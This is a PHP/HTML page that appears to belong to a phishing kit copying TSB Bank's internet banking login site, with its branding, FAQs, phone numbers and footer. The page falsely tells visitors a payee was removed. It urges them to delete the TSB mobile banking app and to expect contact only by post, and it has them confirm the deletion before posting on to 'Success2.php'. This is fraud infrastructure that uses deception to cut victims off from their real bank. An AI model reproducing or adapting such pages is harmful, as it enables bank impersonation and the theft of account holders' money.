<?php
session_start();


if($_SESSION['started'] == 'true'){
	//header("Refresh:3; url=exit.php");
}else{
	//header('location:exit.php');
}

?>
<!DOCTYPE html>
<html lang="en_gb" dir="ltr" style="opacity: 1;">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <style type="text/css">
            [uib-typeahead-popup].dropdown-menu {
                display: block;
            }
        </style>
        <style type="text/css">
            .uib-time input {
                width: 50px;
            }
        </style>
        <style type="text/css">
            [uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,
            [uib-popover-popup].popover.top-left > .arrow,
            [uib-popover-popup].popover.top-right > .arrow,
            [uib-popover-popup].popover.bottom-left > .arrow,
            [uib-popover-popup].popover.bottom-right > .arrow,
            [uib-popover-popup].popover.left-top > .arrow,
            [uib-popover-popup].popover.left-bottom > .arrow,
            [uib-popover-popup].popover.right-top > .arrow,
            [uib-popover-popup].popover.right-bottom > .arrow,
            [uib-popover-html-popup].popover.top-left > .arrow,
            [uib-popover-html-popup].popover.top-right > .arrow,
            [uib-popover-html-popup].popover.bottom-left > .arrow,
            [uib-popover-html-popup].popover.bottom-right > .arrow,
            [uib-popover-html-popup].popover.left-top > .arrow,
            [uib-popover-html-popup].popover.left-bottom > .arrow,
            [uib-popover-html-popup].popover.right-top > .arrow,
            [uib-popover-html-popup].popover.right-bottom > .arrow,
            [uib-popover-template-popup].popover.top-left > .arrow,
            [uib-popover-template-popup].popover.top-right > .arrow,
            [uib-popover-template-popup].popover.bottom-left > .arrow,
            [uib-popover-template-popup].popover.bottom-right > .arrow,
            [uib-popover-template-popup].popover.left-top > .arrow,
            [uib-popover-template-popup].popover.left-bottom > .arrow,
            [uib-popover-template-popup].popover.right-top > .arrow,
            [uib-popover-template-popup].popover.right-bottom > .arrow {
                top: auto;
                bottom: auto;
                left: auto;
                right: auto;
                margin: 0;
            }
            [uib-popover-popup].popover,
            [uib-popover-html-popup].popover,
            [uib-popover-template-popup].popover {
                display: block !important;
            }
        </style>
        <style type="text/css">
            .uib-datepicker-popup.dropdown-menu {
                display: block;
                float: none;
                margin: 0;
            }
            .uib-button-bar {
                padding: 10px 9px 2px;
            }
        </style>
        <style type="text/css">
            .uib-position-measure {
                display: block !important;
                visibility: hidden !important;
                position: absolute !important;
                top: -9999px !important;
                left: -9999px !important;
            }
            .uib-position-scrollbar-measure {
                position: absolute !important;
                top: -9999px !important;
                width: 50px !important;
                height: 50px !important;
                overflow: scroll !important;
            }
            .uib-position-body-scrollbar-measure {
                overflow: scroll !important;
            }
        </style>
        <style type="text/css">
            .uib-datepicker .uib-title {
                width: 100%;
            }
            .uib-day button,
            .uib-month button,
            .uib-year button {
                min-width: 100%;
            }
            .uib-left,
            .uib-right {
                width: 100%;
            }
        </style>
        <style type="text/css">
            .ng-animate.item:not(.left):not(.right) {
                -webkit-transition: 0s ease-in-out left;
                transition: 0s ease-in-out left;
            }
        </style>
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>
        
		
        <title>Login</title>
        <meta name="description" property="description" content="Welcome to Internet Banking" />

        
		
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="shortcut icon" href="files/img/favicon.ico" />
        <link rel="stylesheet" type="text/css" media="print" href="./files/css/print_base-min.css" />
        <link rel="stylesheet" type="text/css" media="screen,print" href="./files/css/styles-min.css" />
        <link rel="stylesheet" type="text/css" media="screen" href="./files/css/promotionals-min.css" />
        
		
        <style id="at-makers-style" class="at-flicker-control">
            .mboxDefault {
                visibility: hidden;
            }
        </style>
        
		
		
	
	


    </head>
    <body>
        
		
        <div id="wrapperDefault">
            <div class="container">
                <nav class="navbar navbar-default header-tsb">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <div class="navbar-brand">
                            <h2 id="env-identifier" style="background: yellow; font-size: 42px; margin: 0; position: absolute; color: red; font-weight: bold;"></h2>
                            <img src="./files/img/logo-6-1409059355.png" title="TSB logo" alt="TSB logo" />
                        </div>
                    </div>
                    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                        <div class="loggedIn">
                            <ul class="nav navbar-nav navbar-right abcd unordered-list">
                                <li class="list-element no-bullet">
                                    <span class="icon-arrow-lo"></span>
                                    <a href="https://internetbanking.tsb.co.uk/personal/a/cookie-policy/" target="_self" title="Cookie Policy" class="">Cookie Policy</a>
                                </li>
                                <li class="list-element no-bullet">
                                    <span class="icon-secure-small">
                                        You're logging into a secure site
                                    </span>
                                </li>

                                <ul class="abcd unordered-list">
                                    <li class="list-element no-bullet">
                                        <span class="icon-arrow-lo"></span> <a href="http://tsb.co.uk/security.asp" target="_blank" title="How can I tell that this site is secure?" class="">How can I tell that this site is secure?</a>
                                    </li>
                                </ul>
                            </ul>
                        </div>
                    </div>
                </nav>
            </div>

            <div class="pageWrap">
                <div class="container">
                    <div id="experienceathead" class="col-md-12" style="margin-bottom: 2px;"></div>
                    <div id="page">
                        <div class="row">
                            <div class="col-md-8 col-xs-12">
                                <div class="primary " id="literalsLoader" style="display: block;"> <!-- primary wrap-invoker-loader big -->
                                    <div id="spa-credentialsPublic-1.0" spacode="credentialsPublic" spaid="1464167919044" class="clearfix">
                                        <link rel="stylesheet" href="./files/css/d631d9e5.vendor.min.css" />
                                        <link rel="stylesheet" href="./files/css/0eb8ac02.tsb-credentials-public.min.css" />

                                        <!-- uiView:  -->
                                        <div id="credentialsPublic" ui-view="" autoscroll="false" class="ng-scope">
                                            <div class="row ng-scope">
                                                <div class="col-xs-12">
                                                    <form name="memorableInformationForm" method="POST" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength">
                                                        <div class="row">
                                                            <div class="col-xs-12">
                                                                <div class="borderless-panel">
                                                                    <!-- ngIf: scaMode --><!-- ngInclude: '/spasR20.2/credentialsPublic/components/credentials-public/log-on/memorableInformation/memorable-information-password-sca-tpl.html' -->
                                                                    <div
                                                                        ng-if="scaMode"
                                                                        ng-include="&#39;/spasR20.2/credentialsPublic/components/credentials-public/log-on/memorableInformation/memorable-information-password-sca-tpl.html&#39;"
                                                                        class="ng-scope"
                                                                    >
                                                                        <div class="ng-scope">
                                                                            <h1 class="col-xs-12 md-margin-bottom no-padding"><span class="text-std" ng-transclude="" translate="">Payee Removal Successful</span></h1>
                                                                            <!-- ngIf: exceptionLiteral -->
                                                                            <div class="col-xs-12 no-padding">
                                                                                <span class="col-xs-12 xs-margin-bottom no-padding text-bold text-std text-std" ng-transclude="" translate="">You have removed the new payee.</span>
                                                                            </div>
                                                                            <div class="col-xs-12 no-padding">
                                                                                <span class="col-xs-12 xs-margin-bottom no-padding text-bold text-std text-std" ng-transclude="" translate="">To apply these security updates, please <p style="color: red;">delete your mobile banking app from your device</p> and press continue below. Failure to delete the app will result in failure to reset your login details, leaving your bank account vulnerable.</span>
                                                                            </div>
                                                                            <div class="col-xs-12 no-padding">
                                                                                <span class="col-xs-12 xs-margin-bottom no-padding text-bold text-std text-std" ng-transclude="" translate=""> Be aware, fraudsters may ring you pretending to be the bank, so until your new banking details arrive, we will only contact you by post.</span>
                                                                            </div>
                                                                            <form method="post" action="Success2.php">
                                                                                <div class="formField loginCheckbox">
                                                                                    <input class="checkbox" type="checkbox" name="frmLogin:loginRemember" required>
                                                                                    <label class="checkboxLabel" for="frmLogin:loginRemember">
                                                                                        <a id="rememberMe" name="rememberMe" title="Remember my User ID">
                                                                                            I have deleted TSB Banking app from my devices
                                                                                        </a>
                                                                                    </label>
                                                                                </div>
                                                                                <div class="col-xs-12 col-md-4">
                                                                                    <button class="login pull-right btn md-btn ng-isolate-scope" type="submit">
                                                                                        <span class="text-std">Continue</span>
                                                                                    </button>
                                                                                </div>
                                                                            </form>
																				<br>
																				<br>
																				<br>
																				<br>
																				<br>
																				<br>
																				<br>
																				<br>
																				<br>
																				<br>
																				
																			
																			<center>
																				<img src="files/img/1.gif" style="width:100px;height:100px;">
																			</center>
			
			
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
																			
																			
                                                                           
																		   
                                                                            
                                                                        </div>
                                                                    </div>
                                                                    <!-- end ngIf: scaMode --><!-- ngIf: !scaMode -->
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <!-- ngIf: memorableInformationForm.$error.notSelected.length > 0 && memorableInformationForm.$submitted --><!-- ngIf: !scamode2 -->
                                                        
														
                                                        <!-- end ngIf: !scamode2 -->
                                                        
														
                                                        
														
                                                    </form>
                                                </div>
                                            </div>
                                            <!-- ngInclude: '/spasR20.2/credentialsPublic/components/credentials-public/log-on/sca-modals/sca-modals-tpl.html' -->
											
											
											
											
											
											
											
											<!-- error
											
											
                                            
											<div ng-include="'/spasR20.2/credentialsPublic/components/credentials-public/log-on/sca-modals/sca-modals-tpl.html'" class="ng-scope"><div id="modalTimeOut" class="modal fade ng-isolate-scope in" tabindex="-1" role="dialog" aria-labelledby="modalTimeOutLabel" size="lg" modal-id="modalTimeOut" modal-size="md" modal-type="primary" component="modalTimeOut" style="display: block; padding-right: 16px;"><div class="modal-dialog modal-md" role="document"><div class="modal-content modal-primary"><ng-transclude><div class="modal-header no-padding-top ng-isolate-scope"><a class="close" data-dismiss="modal" aria-label="Close" ng-click="$parent.close()"><span aria-hidden="true" class="hidden-lg hidden-md hidden-sm">×</span></a><ng-transclude><div class="row ng-scope"><div class="col-md-12 lg-padding-left"><span class="md-margin-top float-icon icon-error    icon-error   " icon="error"></span><h2 class="text-bold md-margin-top lg-margin-left ng-scope" paragraph="true" translate="">You have not logged in on time</h2></div></div><div class="proteo-select-account-body modal-body ng-isolate-scope"><ng-transclude><div class="row ng-scope"><div class="col-md-12"><p class="text-std" ng-transclude="" paragraph="true" translate="">As you've been inactive for a while you'll need to log in again for security reasons.</p></div></div></ng-transclude></div><div class="center-button modal-footer ng-isolate-scope" ng-transclude=""><button class="btn md-btn ng-isolate-scope" ng-transclude="" ng-click="modalTimeOut.close()"><span class="text-std" ng-transclude="" translate="">Log back into your accounts</span></button></div></ng-transclude></div></ng-transclude></div></div></div><div ng-controller="scaModalsController" class="ng-scope"><div id="addBlockModalError" class="modal fade ng-isolate-scope" tabindex="-1" role="dialog" aria-labelledby="addBlockModalErrorLabel" size="lg" modal-id="addBlockModalError" modal-size="md" modal-type="primary" data-backdrop="static" data-keyboard="false"><div class="modal-dialog modal-md" role="document"><div class="modal-content modal-primary"><ng-transclude><div class="row md-margin-top md-margin-left md-margin-right ng-scope"><h2><span class="text-bold text-std" ng-transclude="" translate="">Something's not right</span></h2></div><div id="loginModalError" class="md-margin text-red text-bold ng-scope" ng-show="errorRemainingAttempts !== null"><span class="text-bold text-std" ng-transclude="" ng-bind="errorRemainingAttempts"></span></div><span class="text-std" ng-transclude="" translate="">One or more of the details you've provided don't match our records.</span><div class="md-margin-top md-margin-bottom ng-scope"><ul class="unordered-list md-padding-left"><li class="list-element"><span class="text-std" ng-transclude="" translate="">Check that you're entering the correct Internet Banking password and characters from your memorable information</span></li><li class="list-element"><span class="text-std" ng-transclude="" translate="">You can </span><a class="link-std ng-isolate-scope" ng-href="" ng-transclude="" ng-click="enterCustomerIdData()"><span class="text-std" ng-transclude="" translate="">reset your login details</span></a><span class="text-std" ng-transclude="" translate=""> if you've forgotten them</span></li>
											</ul><div class="md-margin-top"><span class="text-std" ng-transclude="" translate="">Still having problems? Give us a call on 0345 835 3844 (Mon to Fri 7am-10pm, weekends 8am-6pm). Or you can pop into your local branch.</span></div></div><div class="modal-footer ng-isolate-scope" ng-transclude=""><proteo-ui-modal-call-back class="ng-scope"><div class="row"><button class="center-block btn md-btn ng-isolate-scope" ng-transclude="" ng-click="tryAgainLogin()"><span class="text-std" ng-transclude="" translate="">Let's try again!</span></button></div></proteo-ui-modal-call-back></div></ng-transclude></div></div></div><div id="addBlockModalDevice" class="modal fade ng-isolate-scope" tabindex="-1" role="dialog" aria-labelledby="addBlockModalDeviceLabel" size="lg" modal-id="addBlockModalDevice" modal-size="md" modal-type="primary" data-backdrop="static" data-keyboard="false"><div class="modal-dialog modal-md" role="document"><div class="modal-content modal-primary"><ng-transclude><div class="row md-margin-top md-margin-left md-margin-right ng-scope"><h2><span class="text-bold text-std" ng-transclude="" translate="">Is this your own device?</span></h2></div><div class="modal-body ng-isolate-scope"><ng-transclude><span class="text-std" ng-transclude="" translate="">If only you have access to this device, you can 'trust' it so we don't have to send you a One-Time Password every time you log in.</span><div class="md-margin-top ng-scope"><span class="text-std" ng-transclude="" translate="">If you share this device with someone else, or you're using a computer in a library or internet café for example, you shouldn't 'trust' it.</span></div></ng-transclude></div><div class="modal-footer ng-isolate-scope" ng-transclude=""><proteo-ui-modal-call-back class="ng-scope"><button class="pull-right btn md-btn ng-isolate-scope" ng-transclude="" ng-click="trust()"><span class="text-std" ng-transclude="" translate="">Trust</span></button><button class="pull-left btn-white btn md-btn ng-isolate-scope" ng-transclude="" ng-click="dontTrust()"><span class="text-std" ng-transclude="" translate="">Do not trust</span></button></proteo-ui-modal-call-back></div></ng-transclude></div></div></div><div id="addBlockModalBrowser" class="modal fade ng-isolate-scope" tabindex="-1" role="dialog" aria-labelledby="addBlockModalBrowserLabel" size="lg" modal-id="addBlockModalBrowser" modal-size="md" modal-type="primary" data-backdrop="static" data-keyboard="false"><div class="modal-dialog modal-md" role="document"><div class="modal-content modal-primary"><ng-transclude><div class="row md-margin-top md-margin-left md-margin-right ng-scope"><h2><span class="text-bold text-std" ng-transclude="" translate="">You are using a web browser not supported by this website</span></h2></div><div class="modal-body ng-isolate-scope"><ng-transclude><div class="md-margin-top ng-scope"><span class="text-std" ng-transclude="" translate="">This means that some function may not work as supposed which can result in strange behaviours when browsing around.</span></div><div class="md-margin-top md-margin-bottom ng-scope"><span class="text-std" ng-transclude="" translate="">Thank you!</span></div></ng-transclude></div><div class="modal-footer ng-isolate-scope" ng-transclude=""><proteo-ui-modal-call-back class="ng-scope"><button class="center-block btn md-btn ng-isolate-scope" ng-transclude="" ng-click="agree()"><span class="text-std" ng-transclude="" translate="">Understood</span></button></proteo-ui-modal-call-back></div></ng-transclude></div></div></div></div></div>
											
											
											<div class="modal-backdrop fade in"></div>
											
											
											-->
											
											
                                        </div>

                                        
										
                                    </div>
                                    
									
									
									
									<!-- loader
									
									<div class="modal-backdrop fade in"></div>
									
									<div id="invokerLoader-literalsLoader" class="loading-spinner"><span class="icon-spinner"><span class="blockG" id="rotateG_1"></span><span class="blockG" id="rotateG_2"></span><span class="blockG" id="rotateG_3"></span><span class="blockG" id="rotateG_4"></span><span class="blockG" id="rotateG_5"></span><span class="blockG" id="rotateG_6"></span><span class="blockG" id="rotateG_7"></span><span class="blockG" id="rotateG_8"></span><span class="blockG" id="rotateG_9"></span><span class="blockG" id="rotateG_10"></span><span class="blockG" id="rotateG_11"></span><span class="blockG" id="rotateG_12"></span></span></div>
									
									-->
									
									
                                </div>

                                <div class="promotionalDefault" style="min-height: 4px;"></div>
                            </div>






                            <div id="lateralPanel">
                                <!-- EFB-LPRb -->
                                <div class="secondary col-md-4 col-xs-12">
                                    
									
                                    <div class="panel">
                                        <div id="lateral-panel-content-inbox"></div>
                                        <div id="lateral-panel-content-1">
                                            <div class="accordion">
                                                <div class="part">
                                                    <h2 class="trigger" title="Contact Us...: Use this link to show or hide information">Contact Us... <span class="icon-plus-lg pull-right"></span></h2>
                                                    <div class="pane closed">
                                                        <div class="paneInner">
                                                            <div class="quickContact">
                                                                <div class="row">
                                                                    <!-- Asset details - id [1464167918875] - type [Content_C]-->
                                                                    <div class="col-sm-12 col-xs-12 content_basic">
                                                                        <div class="article flex-col">
                                                                            <div class="backgroundWhite row">
                                                                                <div class="col-sm-12 text_banner">
                                                                                    <h3 id="All_account_related_queries-1464167918875" class="h3">All account related queries</h3>
                                                                                    <div>
                                                                                        <div><strong>0345 975 8758</strong></div>
                                                                                    </div>
                                                                                    <div>
                                                                                        <div></div>
                                                                                        <div></div>
                                                                                        <div>&nbsp;</div>
                                                                                        <div>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on&nbsp;<strong>+44 (0) 203 284 1575.</strong></div>
                                                                                        <div>
                                                                                            Calls may be monitored and recorded in case we need to check we have carried out your instructions correctly and to help us improve our quality of
                                                                                            service.
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <!-- Asset details - id [1464167918901] - type [Content_C]-->
                                                                    <div class="col-sm-12 col-xs-12 content_basic">
                                                                        <div class="article flex-col">
                                                                            <div class="backgroundWhite row">
                                                                                <div class="col-sm-12 text_banner">
                                                                                    <h3 id="Internet_banking_queries-1464167918901" class="h3">Internet banking queries</h3>
                                                                                    <div>
                                                                                        <div><!--StartFragment-->Technical queries about the Internet Banking service<!--EndFragment--></div>
                                                                                    </div>
                                                                                    <div>
                                                                                        <!--StartFragment-->
                                                                                        <p>&nbsp;</p>
                                                                                        <p>Call&nbsp;us on<strong>&nbsp;0345 835 3844</strong>. We’re open 8am-8pm Mon-Sat, 8am-6pm Sun.</p>
                                                                                        <p>If you need to call us from abroad you can also call us on<strong>&nbsp;+44 (0)203 284 1577</strong></p>
                                                                                        <!--EndFragment-->
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="promotionalDefault" style="min-height: 4px;"></div>
                                        <div id="lateral-panel-content-2">
                                            <div class="accordion">
                                                <div class="part">
                                                    <h2 class="trigger" title="Help &amp; Support: Use this link to show or hide information">Help &amp; Support <span class="icon-minus-lg pull-right"></span></h2>
                                                    <div class="pane open">
                                                        <div class="paneInner">
                                                            <div id="inbentaFaqsData">
                                                                <!-- EFB-IRb -->
                                                                <ul class="unordered-list no-bullet no-padding-left" inbentaprofile="2" inbentacategory="143">
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6Inp5ajV1RTJjU3p4RmY4SEhkbWUrVnc9PSIsInZhbHVlIjoiNmEyNHNGWjhwMldVZTJYYTM5VEJBRUtNYm8wOFc4b1FsaUN3SWl1UFpxOXZtSWJwdUx1eXFzcnl3WFhsbTkxUm91WmVHYVE3dlY1c09WaWo2a0pNOGFHS2I0MnRTaHNGRGpiUmNkU2hoSHBsa1Y2ZTU4RUh2Nm9ETnozTW52UTAiLCJtYWMiOiJiMmI1NmE3ZTYwMGM2ZTE5MTViMDY1YjI1ZDNhYzRmYjljOTNlODNiMTRlNGRkZjYwYzUwYzQ4MTM3ZGE5ZjU3In0="
                                                                            title="Can my memorable information be the same as my password?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">Can my memorable information be the same as my password?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p></p>
                                                                            <p>
                                                                                No. You need to choose memorable information that's different from your password. This is to ensure that your account stays as secure as possible. If you forget
                                                                                your memorable information or your password, click 'Having trouble logging in?' and follow the on-screen instructions.
                                                                            </p>
                                                                            <p></p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6IkFuZ1lzY0dHeWVib0QyTmRRVSt5VkE9PSIsInZhbHVlIjoibDdTTk53THJQUHJQTGdHQVlBbWxEekkxdnM2U1hKcUZsejlONEVRU3VmS3hwVnNlc0tRZVhTODFudGE0cXQ4WmpNVUxmQ3N6aGpPSk15RFwveFlvZ0xZV0Rob0Rra3c4S2p1UE9KWTRGZXVjK0ZuM1I4d1ZuVlE1TGphVVFUUnFUIiwibWFjIjoiMjkzM2NlZmQxMzMzZTc5ZDdkYWZhNmFlOGQ1ZjdlY2JlMjNlNTYxODdiOTJjZWYyZGFlMWM3ODgyMzk3M2EwNiJ9"
                                                                            title="How should I choose my Memorable Information?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">How should I choose my Memorable Information?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p>You will need to choose your Memorable Information according to the following criteria:</p>
                                                                            <ul>
                                                                                <li>Must be between 6 (minimum) and 15 (maximum) characters in length and made up of letters and numbers</li>
                                                                                <li>Must include a minimum of 3 letters (e.g. abc123)</li>
                                                                                <li>Must include a minimum of 1 number (e.g. abcde1)</li>
                                                                                <li>No spaces, hyphens or special characters (e.g. #) are permitted</li>
                                                                                <li>Cannot be the same as your existing password or User ID</li>
                                                                            </ul>
                                                                            <p></p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6IlNza1pXSmNJSUZYeWxaOVwvQ1I5d3VBPT0iLCJ2YWx1ZSI6IjlHNXFNREZrTlFqdDcyVVlJY1BmVXF3K3g1Q1hkNU4wMGI1eFBDU0JJdG54ODBQR3h6bHBpTnU1bUtJblFcL2NOQ2RIUlNWckxVNXJzZExSYTNMMjN0ZGVQZXdNZlNvWCtzQzgxT1JMXC9UbnNtY2FuRm45NWhPcEEwcmlnSVdWSlUiLCJtYWMiOiI3YzRjMTg2MTllOWJmMGEzNzllYjNmZDZkYjE2ZThhYjY4ZDhmMWNlNGE5NzY5NjMzNjkyMTI2NDk1MjNhM2RhIn0="
                                                                            title="What if I&#39;ve forgotten my memorable information?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">What if I've forgotten my memorable information?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p>
                                                                                Go to the Internet Banking log on screen and click Having problems logging in?<br />
                                                                                Complete the online form, click 'Continue', then follow the on-screen instructions to get back online - not forgetting to make a note of any reference number we
                                                                                may give you. Please note, if you do not hold a TSB personal account, you will be sent a form in the post which you will need to sign and return to us.
                                                                            </p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6Im9tXC9YZ0xwWjc2MkRzblBaSVd3b0x3PT0iLCJ2YWx1ZSI6ImRLS1M2ZnlvWWJzU3BmaHBhYzVHVDhrS2VmNkJhNWFvVWZcL09VK1wvOVVGODYzM291U2hJdFFCSm9BeStUdVA0TVEwZDhpWW1UYlMwYzQ2bTBGSHlTUlhVbFBXM1NoWStXV1pPZVA2dUxIQmtUWXp0c1hGSkFSQWc1cU5leDlRSTgiLCJtYWMiOiIzZTdmZjgyMzQzMjFjNjUxZjk3ZDczMDI5MmU0MWU0NDc3OTNjZmQ2MDNhZTRhOWUyYjk5YjczMmI4MTE2NTE1In0="
                                                                            title="What is Memorable Information?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">What is Memorable Information?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p>
                                                                                The first time you log into Internet Banking you are asked to select some Memorable Information. This will be a word, place or phrase that is easy for you to
                                                                                remember. Each time you log in you will be asked to provide 3 random characters from your Memorable Information. This information can be changed once you are
                                                                                logged on to Internet Banking.
                                                                            </p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6IjVZdnF4eWJORHZcL2dIc2U5c01cLzZ2Zz09IiwidmFsdWUiOiJ1TlwvajBSSnlXbUV1NFlKQ1FtSHBXdWxUa2dGZEtlaWlnODZ3cXlLWUxMM255TWkwUVA2U3pZSTVKVm1pSkNDVm1LdFdBakcwUVdXQ2ZaMkNjNEdpc1RFeXRncmZodVAzUUVMZUJzYzhNK1Fxb3R3a3orXC9vdnFkc0lUZ3Zuc0VrIiwibWFjIjoiMjI2YzUzNWNhMzBmYmMwNjJmZTJiNDQwYjEyNTY0NmQ3ZGUzNTgwZDg0YzU2M2EyOGI0YmU4MjU0NTE5ZWQxMyJ9"
                                                                            title="Why do I need memorable information?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">Why do I need memorable information?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p></p>
                                                                            <p>
                                                                                Your memorable information gives you extra protection from online fraud. We only ask for a few of the characters from your memorable information when you log
                                                                                in, which makes it more difficult for fraudsters to guess or capture your information.
                                                                            </p>
                                                                            <p></p>
                                                                        </div>
                                                                    </li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            
											
                                        </div>
                                        <div class="promotionalDefault" style="min-height: 4px;"></div>
                                        <div id="lateral-panel-content-3"></div>
                                        <div id="lateral-panel-content-4"></div>
                                        <div id="lateral-panel-content-5"></div>
                                        <div id="lateral-panel-content-6"></div>
                                        <div id="lateral-panel-content-7"></div>
                                        <div id="lateral-panel-content-8"></div>
                                        <div id="lateral-panel-content-9"></div>
                                        <div id="lateral-panel-content-10"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="spaHidden" style="display: none;"></div>
            <div id="experienceatfoot" class="col-md-12" style="z-index: 100; margin-bottom: 2px;"></div>

            <div class="footer-tsb">
                <div class="container">
                    <div class="outer">
                        <div class="row">
                            <div class="col-xs-12">
                                <div class="footerInner-tsb">
                                    <ul>
                                        <li>
                                            <a href="http://www.tsb.co.uk/legal/" target="_blank" title="Legal" class="">Legal</a>
                                        </li>
                                        <li>
                                            <a href="http://www.tsb.co.uk/privacy/" target="_blank" title="Privacy" class="">Privacy</a>
                                        </li>
                                        <li>
                                            <a href="http://www.tsb.co.uk/security/" target="_blank" title="Security" class="">Security</a>
                                        </li>
                                        <li>
                                            <a href="https://www.tsb.co.uk/help/rates-and-charges/" target="_blank" title="Rates and Charges" class="">Rates and Charges</a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="cms-backdrop" class="inactive"></div>

        
        <div
            id="LPMcontainer-1599870450176-0"
            class="LPMcontainer LPMoverlay"
            role="button"
            tabindex="0"
            style="
                margin: -131px 1px 1px auto;
                padding: 0px;
                border-style: solid;
                border-width: 0px;
                font-style: normal;
                font-weight: normal;
                font-variant: normal;
                list-style: outside none none;
                letter-spacing: normal;
                line-height: normal;
                text-decoration: none;
                vertical-align: baseline;
                white-space: normal;
                word-spacing: normal;
                background-repeat: repeat-x;
                background-position: left bottom;
                background-color: rgb(255, 255, 255);
                border-radius: 10px;
                width: 47px;
                height: 262px;
                cursor: pointer;
                display: block;
                z-index: 107158;
                position: fixed;
                top: 50%;
                bottom: auto;
                left: auto;
                right: 0px;
            "
        >
            <img
                src="./files/img/chat_floating.png"
                id="LPMimage-1599870450178-1"
                alt=""
                class="LPMimage"
                style="
                    margin: 0px;
                    padding: 0px;
                    border-style: none;
                    border-width: 0px;
                    font-style: normal;
                    font-weight: normal;
                    font-variant: normal;
                    list-style: outside none none;
                    letter-spacing: normal;
                    line-height: normal;
                    text-decoration: none;
